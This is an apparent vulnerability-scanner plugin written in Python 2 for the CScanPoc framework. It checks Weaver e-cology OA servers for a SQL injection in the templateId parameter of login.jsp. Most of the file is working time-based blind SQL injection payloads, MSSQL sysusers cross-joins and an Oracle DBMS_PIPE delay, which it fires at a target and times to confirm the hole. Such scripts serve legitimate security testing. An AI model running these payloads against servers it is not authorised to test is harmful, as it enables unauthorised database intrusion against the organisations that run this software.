# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import md5
import time

class Vuln(ABVuln):
    poc_id = '5ad7e9dd-84a4-4852-ba19-00ba786752ff'
    name = '泛微e-cology SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-08-27'  # 漏洞公布时间
    desc = '''
        泛微e-cology参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9eec6427-0e6a-4efc-a7db-ba21d64ad6d3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-074007
            hh = hackhttp.hackhttp()

            #MSSQL
            payload1 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20and%20(SELECT%20count(*)%20FROM%20sysusers%20AS%20sys1,%20sysusers%20assys2,%20sysusers%20as%20sys3,%20sysusers%20AS%20sys4,%20sysusers%20AS%20sys5,%20sysusers%20AS%20sys6,sysusers%20AS%20sys7,%20sysusers%20AS%20sys8)=1%20and%20'1'='1"
            payload2 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20and%201=1%20and%20'1'='1"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(_1+' has injection(MSSQL)')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #Oracle
            else:
                payload1 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(102)||CHR(119)||CHR(86),5)%20AND%20'bcBY'='bcBY"
                payload2 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=6120%20AND%20'bcBY'='bcBY"
                t1 = time.time()
                code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
                t2 = time.time()
                code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
                t3 = time.time()
                if (t2 - t1 - t3 + t2 > 3):
                    #security_hole(_1+' has injection(Oracle)')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
